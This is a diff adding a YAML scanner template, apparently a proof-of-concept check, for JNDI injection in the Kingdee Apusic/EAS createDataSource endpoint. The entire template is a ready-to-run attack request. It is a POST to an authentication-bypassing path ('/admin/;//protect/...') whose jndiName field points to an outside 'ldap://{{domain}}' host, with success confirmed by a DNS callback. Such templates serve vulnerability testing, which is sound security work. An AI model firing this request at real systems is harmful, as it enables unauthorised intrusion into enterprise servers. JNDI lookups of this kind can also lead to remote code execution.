@@ -1,0 +1,15 @@
+name: 金蝶-Apusic-金蝶EAS-createDataSource-JNDI注入
+description: >-
+  JNDI注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /admin/;//protect/datasource/createDataSource
+    dnslog: domain
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      name=nobg7&jndiName=ldap://{{domain}}&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=nobg7&userName=nobg7&password=nobg7&repassword=nobg7&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
+    expression:
+      dnslogCheck: true
